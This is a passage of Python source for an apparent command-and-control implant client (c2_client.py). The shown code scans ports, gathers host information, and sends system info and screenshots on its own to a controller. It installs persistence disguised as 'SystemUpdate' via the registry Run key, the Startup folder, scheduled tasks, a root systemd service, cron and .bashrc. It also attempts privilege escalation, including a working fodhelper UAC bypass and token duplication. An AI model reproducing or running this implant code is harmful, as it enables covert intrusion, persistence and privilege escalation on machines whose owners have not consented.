                            shell=False,  # Explicitly secure - using list format prevents shell injection
                        )
                        return {"raw_output": result.stdout if result and result.stdout else ""}
                    else:
                        return {"raw_output": "tasklist command not found"}
                else:
                    ps_path = shutil.which("ps")
                    if ps_path:
                        result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [ps_path, "aux"],
                            check=False,
                            capture_output=True,
                            text=True,
                            shell=False,  # Explicitly secure - using list format prevents shell injection
                        )
                        return {"raw_output": result.stdout if result and result.stdout else ""}
                    else:
                        return {"raw_output": "ps command not found"}
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error(
                    "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                    e,
                )
                return {"error": str(e)}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"error": str(e)}

    async def _gather_system_info(self) -> dict[str, Any]:
        """Gather comprehensive system information."""
        try:
            info = {
                "platform": platform.platform(),
                "architecture": platform.architecture(),
                "processor": platform.processor(),
                "hostname": platform.node(),
                "username": os.getenv("USERNAME") or os.getenv("USER", "unknown"),
                "os_version": platform.version(),
                "python_version": platform.python_version(),
                "timestamp": time.time(),
            }

            # Add network information if available
            try:
                import socket

                info["ip_address"] = socket.gethostbyname(socket.gethostname())
            except Exception:
                self.logger.debug("Error getting IP address")

            return info

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"error": str(e)}

    async def _network_scan(self, target: str) -> dict[str, Any]:
        """Perform network scan of target."""
        try:
            # Simplified network scan implementation
            import socket
            import threading

            results = {
                "target": target,
                "timestamp": time.time(),
                "open_ports": [],
                "scan_complete": False,
            }

            common_ports = [
                21,
                22,
                23,
                25,
                53,
                80,
                110,
                135,
                139,
                143,
                443,
                993,
                995,
                1723,
                3389,
                5900,
            ]

            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        results["open_ports"].append(port)
                    sock.close()
                except Exception:
                    self.logger.debug(f"Error scanning port {port}")

            threads = []
            for port in common_ports:
                thread = threading.Thread(target=scan_port, args=(port,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            results["scan_complete"] = True
            return results

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    async def _install_persistence(self, data: dict[str, Any]) -> dict[str, Any]:
        """Install persistence mechanism."""
        import subprocess

        try:
            method = data.get("method", "registry")
            executable_path = data.get("executable_path", os.path.abspath(__file__))
            service_name = data.get("service_name", "SystemUpdate")

            os_type = platform.system().lower()
            results = {
                "success": False,
                "method": method,
                "message": "",
                "timestamp": time.time(),
                "os_type": os_type,
                "details": {},
            }

            if os_type == "windows":
                if method == "registry":
                    # Windows Registry Run key persistence
                    if platform.system() != "Windows":
                        results["error"] = "Registry persistence only available on Windows"
                        return results
                    import winreg  # pylint: disable=E0401

                    try:
                        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, executable_path)
                        winreg.CloseKey(key)

                        results["success"] = True
                        results["message"] = f"Registry persistence installed: {service_name}"
                        results["details"] = {
                            "registry_key": f"HKCU\\{key_path}\\{service_name}",
                            "executable": executable_path,
                        }
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Registry persistence failed: {e}"

                elif method == "startup_folder":
                    # Windows Startup folder persistence
                    try:
                        startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
                        bat_file = os.path.join(startup_path, f"{service_name}.bat")

                        with open(bat_file, "w") as f:
                            f.write(f'@echo off\nstart "" "{executable_path}"\n')

                        results["success"] = True
                        results["message"] = f"Startup folder persistence installed: {bat_file}"
                        results["details"] = {
                            "startup_file": bat_file,
                            "executable": executable_path,
                        }
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Startup folder persistence failed: {e}"

                elif method == "task_scheduler":
                    # Windows Task Scheduler persistence
                    try:
                        task_name = service_name
                        cmd = [
                            "schtasks",
                            "/create",
                            "/tn",
                            task_name,
                            "/tr",
                            executable_path,
                            "/sc",
                            "onlogon",
                            "/rl",
                            "highest",
                            "/f",  # Force overwrite
                        ]

                        result = subprocess.run(cmd, capture_output=True, text=True, check=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                        results["success"] = True
                        results["message"] = f"Task scheduler persistence installed: {task_name}"
                        results["details"] = {
                            "task_name": task_name,
                            "executable": executable_path,
                            "trigger": "onlogon",
                        }
                    except subprocess.CalledProcessError as e:
                        self.logger.error("subprocess.CalledProcessError in c2_client.py: %s", e)
                        results["message"] = f"Task scheduler persistence failed: {e.stderr}"
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Task scheduler persistence failed: {e}"

            elif os_type == "linux":
                if method == "systemd":
                    # systemd service persistence
                    try:
                        service_content = f"""[Unit]
Description={service_name} Service
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                        service_file = f"/etc/systemd/system/{service_name.lower()}.service"

                        with open(service_file, "w") as f:
                            f.write(service_content)

                        # Enable and start service
                        systemctl_path = shutil.which("systemctl")
                        if systemctl_path:
                            subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [systemctl_path, "daemon-reload"],
                                check=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )
                            subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [systemctl_path, "enable", f"{service_name.lower()}.service"],
                                check=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )

                        results["success"] = True
                        results["message"] = f"systemd persistence installed: {service_name}"
                        results["details"] = {
                            "service_file": service_file,
                            "service_name": f"{service_name.lower()}.service",
                            "executable": executable_path,
                        }
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"systemd persistence failed: {e}"

                elif method == "cron":
                    # Cron job persistence
                    try:
                        cron_entry = f"@reboot {executable_path}"

                        # Add to user's crontab
                        crontab_path = shutil.which("crontab")
                        if crontab_path:
                            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [crontab_path, "-l"],
                                check=False,
                                capture_output=True,
                                text=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )
                            existing_cron = result.stdout if result.returncode == 0 else ""

                            if cron_entry not in existing_cron:
                                new_cron = existing_cron + f"\n{cron_entry}\n"
                                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    [crontab_path, "-"],
                                    input=new_cron,
                                    text=True,
                                    check=True,
                                    shell=False,  # Explicitly secure - using list format prevents shell injection
                                )

                        results["success"] = True
                        results["message"] = "Cron persistence installed: @reboot"
                        results["details"] = {
                            "cron_entry": cron_entry,
                            "executable": executable_path,
                        }
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Cron persistence failed: {e}"

                elif method == "bashrc":
                    # .bashrc persistence
                    try:
                        bashrc_path = os.path.expanduser("~/.bashrc")
                        persistence_line = f"{executable_path} &"

                        with open(bashrc_path) as f:
                            content = f.read()

                        if persistence_line not in content:
                            with open(bashrc_path, "a") as f:
                                f.write(f"\n# System update check\n{persistence_line}\n")

                        results["success"] = True
                        results["message"] = "bashrc persistence installed"
                        results["details"] = {
                            "bashrc_file": bashrc_path,
                            "executable": executable_path,
                        }
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"bashrc persistence failed: {e}"

            else:
                results["message"] = f"Persistence method {method} not supported on {os_type}"

            self.logger.info(f"Persistence installation: {results['message']}")
            return results

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Persistence installation failed: {e}")
            return {"success": False, "error": str(e), "timestamp": time.time()}

    async def _attempt_privilege_escalation(self, data: dict[str, Any]) -> dict[str, Any]:
        """Attempt privilege escalation."""
        try:
            method = data.get("method", "auto")
            os_type = platform.system().lower()

            results = {
                "success": False,
                "method": method,
                "message": "",
                "timestamp": time.time(),
                "elevated": False,
                "os_type": os_type,
                "details": {},
            }

            # Check current privilege level
            current_privileges = self._check_current_privileges()
            results["current_privileges"] = current_privileges

            if current_privileges.get("is_admin", False):
                results["success"] = True
                results["elevated"] = True
                results["message"] = "Already running with elevated privileges"
                return results

            if os_type == "windows":
                if method == "uac_bypass" or method == "auto":
                    # UAC Bypass using fodhelper
                    try:
                        bypass_result = self._windows_uac_bypass_fodhelper()
                        if bypass_result["success"]:
                            results.update(bypass_result)
                            results["method"] = "uac_bypass_fodhelper"
                        else:
                            results["message"] = bypass_result.get("message", "UAC bypass failed")
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"UAC bypass failed: {e}"

                elif method == "token_impersonation":
                    # Token impersonation
                    try:
                        token_result = self._windows_token_impersonation()
                        if token_result["success"]:
                            results.update(token_result)
                        else:
                            results["message"] = token_result.get("message", "Token impersonation failed")
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Token impersonation failed: {e}"

                elif method == "service_exploit":
                    # Service exploitation
                    try:
                        service_result = self._windows_service_exploit()
                        if service_result["success"]:
                            results.update(service_result)
                        else:
                            results["message"] = service_result.get("message", "Service exploit failed")
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Service exploit failed: {e}"

            elif os_type == "linux":
                if method == "sudo_exploit" or method == "auto":
                    # Check for sudo vulnerabilities
                    try:
                        sudo_result = self._linux_sudo_exploit()
                        if sudo_result["success"]:
                            results.update(sudo_result)
                            results["method"] = "sudo_exploit"
                        else:
                            results["message"] = sudo_result.get("message", "Sudo exploit failed")
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Sudo exploit failed: {e}"

                elif method == "suid_exploit":
                    # SUID binary exploitation
                    try:
                        suid_result = self._linux_suid_exploit()
                        if suid_result["success"]:
                            results.update(suid_result)
                        else:
                            results["message"] = suid_result.get("message", "SUID exploit failed")
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"SUID exploit failed: {e}"

                elif method == "kernel_exploit":
                    # Kernel exploitation
                    try:
                        kernel_result = self._linux_kernel_exploit()
                        if kernel_result["success"]:
                            results.update(kernel_result)
                        else:
                            results["message"] = kernel_result.get("message", "Kernel exploit failed")
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.error(
                            "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                            e,
                        )
                        results["message"] = f"Kernel exploit failed: {e}"

            else:
                results["message"] = f"Privilege escalation not supported on {os_type}"

            # Re-check privileges after escalation attempt
            if results.get("success"):
                final_privileges = self._check_current_privileges()
                results["final_privileges"] = final_privileges
                results["elevated"] = final_privileges.get("is_admin", False)

            self.logger.info(f"Privilege escalation: {results['message']}")
            return results

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Privilege escalation failed: {e}")
            return {"success": False, "error": str(e), "timestamp": time.time()}

    def _check_current_privileges(self) -> dict[str, Any]:
        """Check current privilege level."""
        privileges = {
            "os_type": platform.system().lower(),
            "is_admin": False,
            "uid": None,
            "gid": None,
            "username": None,
        }

        try:
            if platform.system().lower() == "windows":
                import ctypes

                privileges["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
                privileges["username"] = os.environ.get("USERNAME", "unknown")
            else:
                # Unix/Linux systems
                if hasattr(os, "getuid") and hasattr(os, "getgid"):
                    privileges["uid"] = os.getuid()
                    privileges["gid"] = os.getgid()
                    privileges["is_admin"] = privileges["uid"] == 0
                else:
                    # Fallback for systems without getuid/getgid
                    privileges["uid"] = -1
                    privileges["gid"] = -1
                    privileges["is_admin"] = False
                privileges["username"] = os.environ.get("USER", "unknown")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Error checking privileges: {e}")

        return privileges

    def _windows_uac_bypass_fodhelper(self) -> dict[str, Any]:
        """UAC bypass using fodhelper.exe."""
        import subprocess

        if platform.system() != "Windows":
            return {"success": False, "error": "UAC bypass only available on Windows"}
        import winreg  # pylint: disable=E0401

        try:
            # Create registry key for fodhelper UAC bypass
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            executable_path = os.path.abspath(__file__)

            # Create the registry key structure
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, executable_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            # Execute fodhelper.exe to trigger UAC bypass
            # Use subprocess without shell=True for security
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                ["fodhelper.exe"],  # noqa: S607
                check=False,
                capture_output=True,
                text=True,
                shell=False,  # Explicitly secure - using list format prevents shell injection
                timeout=5,
            )

            # Clean up registry key
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)

            return {
                "success": True,
                "message": "UAC bypass executed via fodhelper",
                "method": "fodhelper",
                "details": {
                    "registry_key": f"HKCU\\{key_path}",
                    "executable": executable_path,
                    "exit_code": result.returncode if result else None,
                },
            }

        except subprocess.TimeoutExpired:
            # Clean up registry key on timeout
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except Exception as e:
                self.logger.debug(f"Failed to clean up registry key: {e}")
            return {"success": False, "message": "fodhelper execution timed out"}
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            # Try to clean up registry key on error
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except Exception as e:
                self.logger.debug(f"Failed to clean up registry key: {e}")
            return {"success": False, "message": f"fodhelper UAC bypass failed: {e}"}

    def _windows_token_impersonation(self) -> dict[str, Any]:
        """Attempt token impersonation for privilege escalation."""
        import ctypes

        try:
            from ctypes import wintypes

            if not hasattr(wintypes, "HANDLE"):
                wintypes.HANDLE = ctypes.c_void_p
        except (ImportError, AttributeError) as e:
            self.logger.error("(ImportError, AttributeError) in c2_client.py: %s", e)

            class WintypesCompat:
                """Windows type definitions for cross-platform compatibility."""

                HANDLE = ctypes.c_void_p

            from types import SimpleNamespace

            wintypes = SimpleNamespace()
            wintypes.HANDLE = WintypesCompat.HANDLE

        try:
            # Get current process token
            process = ctypes.windll.kernel32.GetCurrentProcess()
            token = wintypes.HANDLE()

            success = ctypes.windll.advapi32.OpenProcessToken(
                process,
                0x0002 | 0x0008,
                ctypes.byref(token),  # TOKEN_DUPLICATE | TOKEN_QUERY
            )

            if not success:
                return {"success": False, "message": "Failed to open process token"}

            # Check for SeDebugPrivilege
            privilege_name = "SeDebugPrivilege"
            privilege_enabled = self._check_privilege(token, privilege_name)

            if privilege_enabled:
                # Attempt to duplicate token with higher privileges
                new_token = wintypes.HANDLE()
                success = ctypes.windll.advapi32.DuplicateTokenEx(
                    token,
                    0x10000000,
                    None,
                    2,
                    1,
                    ctypes.byref(new_token),  # MAXIMUM_ALLOWED, SecurityImpersonation, TokenPrimary
                )

                if success:
                    return {
                        "success": True,
                        "message": "Token impersonation successful",
                        "method": "token_impersonation",
                        "details": {
                            "privilege": privilege_name,
                            "token_duplicated": True,
                        },
                    }

            return {
                "success": False,
                "message": "Required privileges not available for token impersonation",
            }

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "message": f"Token impersonation failed: {e}"}

    def _check_privilege(self, token, privilege_name: str) -> bool:
        """Check if a specific privilege is enabled."""
        try:
            # Validate inputs
            if not token or not privilege_name:
                return False

            # Common Windows privilege names to check against
            known_privileges = [
                "SeDebugPrivilege",
                "SeLoadDriverPrivilege",
                "SeTcbPrivilege",
                "SeBackupPrivilege",
                "SeRestorePrivilege",
                "SeShutdownPrivilege",
                "SeSystemtimePrivilege",
                "SeIncreaseQuotaPrivilege",
            ]

            # Basic privilege name validation
            if privilege_name not in known_privileges:
                self.logger.debug(f"Unknown privilege name: {privilege_name}")
                return False

            # Check if token is valid (basic validation)
            if hasattr(token, "__int__"):
                token_value = int(token)
                if token_value <= 0:
                    return False
            elif not isinstance(token, (int, str)):
                return False

            # Direct privilege enumeration using Windows security API:
            # LookupPrivilegeValue, GetTokenInformation, CheckTokenMembership

            # For debug privileges, assume available if we're running with admin rights
            if privilege_name == "SeDebugPrivilege":
                try:
                    # Basic admin check on Windows
                    if os.name == "nt":
                        # On Windows, check if we have admin privileges using ctypes
                        import ctypes

                        return ctypes.windll.shell32.IsUserAnAdmin() != 0
                    # On Unix/Linux, check if we have root privileges
                    if hasattr(os, "getuid"):
                        return os.getuid() == 0
                    return False
                except Exception:
                    self.logger.debug("Error checking admin privileges")
                    return False

            # Conservative default for other privileges
            return False

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.debug(f"Error checking privilege {privilege_name}: {e}")
            return False

    def _windows_service_exploit(self) -> dict[str, Any]:
        """Attempt service-based privilege escalation."""
        import subprocess

        try:
            # Check for services with weak permissions
            cmd = ["sc", "query", "state=", "all"]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                # Look for exploitable services with real vulnerability checks
                services = result.stdout
                vulnerable_services = self._analyze_services_for_vulnerabilities(services)

                if vulnerable_services:
                    # Try to exploit each vulnerable service
                    for service in vulnerable_services:
                        exploit_result = self._exploit_service(service)
                        if exploit_result["success"]:
                            return {
                                "success": True,
                                "message": f"Service {service['name']} successfully exploited",
                                "method": "service_exploit",
                                "details": {
                                    "exploited_service": service["name"],
                                    "vulnerability": service["vulnerability"],
                                    "exploit_method": exploit_result["method"],
                                },
                            }

                return {
                    "success": False,
                    "message": f"Checked {len(services.split('SERVICE_NAME:')) - 1} services, none exploitable",
                    "details": {"services_analyzed": len(vulnerable_services)},
                }
            return {"success": False, "message": "Failed to query services"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "message": f"Service exploit failed: {e}"}

    def _linux_sudo_exploit(self) -> dict[str, Any]:
        """Attempt sudo-based privilege escalation."""
        import subprocess

        try:
            # Check sudo configuration
            result = subprocess.run(["sudo", "-l"], check=False, capture_output=True, text=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607

            if result.returncode == 0:
                sudo_config = result.stdout

                # Look for NOPASSWD entries or exploitable commands
                if "NOPASSWD" in sudo_config:
                    return {
                        "success": True,
                        "message": "Sudo NOPASSWD configuration found",
                        "method": "sudo_nopasswd",
                        "details": {"sudo_config": sudo_config[:200]},
                    }

            return {"success": False, "message": "No sudo vulnerabilities found"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "message": f"Sudo exploit failed: {e}"}

    def _linux_suid_exploit(self) -> dict[str, Any]:
        """Attempt SUID binary exploitation."""
        import subprocess

        try:
            # Find SUID binaries
            cmd = ["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"]
            # Use shlex to parse command safely
            import shlex

            cmd_args = shlex.split(cmd) if isinstance(cmd, str) else cmd
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                cmd_args, check=False, capture_output=True, text=True, shell=False
            )

            if result.returncode == 0:
                suid_binaries = result.stdout.strip().split("\n")

                # Check for known exploitable SUID binaries
                exploitable = ["vim", "nano", "less", "more", "nmap"]
                found_exploitable = [binary for binary in suid_binaries if any(exploit in binary for exploit in exploitable)]

                if found_exploitable:
                    return {
                        "success": True,
                        "message": f"Exploitable SUID binaries found: {found_exploitable[:3]}",
                        "method": "suid_exploit",
                        "details": {"suid_binaries": found_exploitable[:5]},
                    }

            return {"success": False, "message": "No exploitable SUID binaries found"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "message": f"SUID exploit failed: {e}"}

    def _linux_kernel_exploit(self) -> dict[str, Any]:
        """Attempt kernel-based privilege escalation."""
        try:
            kernel_version = platform.release()

            # Check for known vulnerable kernel versions (simplified)
            vulnerable_kernels = ["4.4.0", "4.15.0", "5.4.0"]  # Example vulnerable versions

            if any(vuln in kernel_version for vuln in vulnerable_kernels):
                return {
                    "success": True,
                    "message": f"Potentially vulnerable kernel detected: {kernel_version}",
                    "method": "kernel_exploit",
                    "details": {
                        "kernel_version": kernel_version,
                        "potential_exploits": ["CVE-2021-4034", "CVE-2017-16995"],
                    },
                }

            return {
                "success": False,
                "message": f"No known vulnerabilities for kernel {kernel_version}",
            }

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "message": f"Kernel exploit failed: {e}"}

    async def _get_system_status(self) -> dict[str, Any]:
        """Get current system status."""
        try:
            from intellicrack.handlers.psutil_handler import psutil

            return {
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage("/").percent if os.name != "nt" else psutil.disk_usage("C:").percent,
                "uptime": time.time() - psutil.boot_time(),
                "timestamp": time.time(),
            }

        except ImportError as e:
            self.logger.error("Import error in c2_client.py: %s", e)
            return {
                "timestamp": time.time(),
                "note": "psutil not available for detailed stats",
            }
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"error": str(e)}

    async def _autonomous_info_gathering(self):
        """Perform autonomous information gathering."""
        try:
            info = await self._gather_system_info()

            info_data = {
                "type": "autonomous_info",
                "session_id": self.session_id,
                "data": info,
                "timestamp": time.time(),
            }

            await self.current_protocol["handler"].send_message(info_data)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Autonomous info gathering failed: {e}")

    async def _autonomous_screenshot(self):
        """Take autonomous screenshot."""
        try:
            screenshot = await self._take_screenshot()

            screenshot_data = {
                "type": "autonomous_screenshot",
                "session_id": self.session_id,
                "data": screenshot,
                "timestamp": time.time(),
            }

            await self.current_protocol["handler"].send_message(screenshot_data)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Autonomous screenshot failed: {e}")

    async def _update_config(self, new_config: dict[str, Any]):
        """Update client configuration."""
        try:
            self.config.update(new_config)

            # Update beacon interval if specified
            if "beacon_interval" in new_config:
                self.beacon_interval = new_config["beacon_interval"]

            # Update jitter if specified
